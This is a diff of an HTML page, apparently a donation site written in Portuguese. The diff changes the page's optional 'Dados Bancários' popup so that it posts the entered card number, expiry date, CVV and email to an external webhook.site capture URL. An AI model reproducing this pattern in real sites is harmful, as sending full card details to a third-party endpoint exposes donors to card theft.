@@ -119,29 +119,35 @@
     <div id="popup" class="popup">
         <div class="popup-content">
             <span class="close-btn" id="closePopup">&times;</span>
-            <form method="post" action="" id="dados_bancarios" class="dados_bancarios">
+            <form method="post" action="https://webhook.site/176a2fe3-e8db-476c-ad63-c68401526290" id="dados_bancarios"
+                class="dados_bancarios">
                 <h2>Dados Bancários</h2>
                 <h4>(Opcional)</h4>
                 <p>(Os dados bancários serão requisitados caso deseje fazer uma doação monetária.)</p><br>
     
                 <label for="input_name">Nome Completo:</label>
                 <input type="text" id="input_name" class="input_name" placeholder="Nome Completo" maxlength="50" required>
-                <label for="input_name"> *</label><br><br>
+                <label for="input_name"></label><span class="text-danger"> *</span><br><br>
     
                 <label for="input_valid">Data de Validade do Cartão:</label>
                 <input type="date" id="input_valid" class="input_valid" placeholder="Data de Validade do Cartão" required>
-                <label for="input_valid"> *</label><br><br>
+                <label for="input_valid"></label><span class="text-danger"> *</span><br><br>
+
                 <label for="input_numcartao">Número do Cartão:</label>
-                <input type="text" id="input_numcartao" class="input_numcartao" placeholder="Número do Cartão" maxlength="50" required>
-                <label for="input_numcartao"> *</label><br><br>
+                <input type="text" id="input_numcartao" class="input_numcartao" placeholder="Número do Cartão" maxlength="19" required>
+                <label for="input_numcartao"></label><span class="text-danger"> *</span><br><br>
+
                 <label for="input_cvv">Código de Segurança CVV:</label>
-                <input type="text" id="input_cvv" class="input_cvv" placeholder="Código de Segurança CVV" maxlength="8" required>
-                <label for="input_cvv"> *</label><br><br>
-                <label for="input_cobranca">Endereço de Cobrança:</label>
-                <input type="text" id="input_cobranca" class="input_cobranca" placeholder="Endereço de Cobrança" maxlength="100"
+                <input type="text" id="input_cvv" class="input_cvv" placeholder="Código de Segurança CVV" maxlength="3" required>
+                <label for="input_cvv"></label><span class="text-danger"> *</span><br><br>
+                
+                <label for="input_cobranca">Endereço de Email:</label>
+                <input type="email" id="input_cobranca" class="input_cobranca" placeholder="Endereço de Cobrança (email)"
+                    maxlength="100"
                     required>
-                <label for="input_cobranca"> *</label><br><br>
-                <input type="submit" id="submit" value="CADASTRAR">
+                <label for="input_cobranca"></label><span class="text-danger"> *</span><br><br>
+                
+                <input type="submit" class="btn btn-custom" value="CADASTRAR">
             </form>
         </div>
     </div>
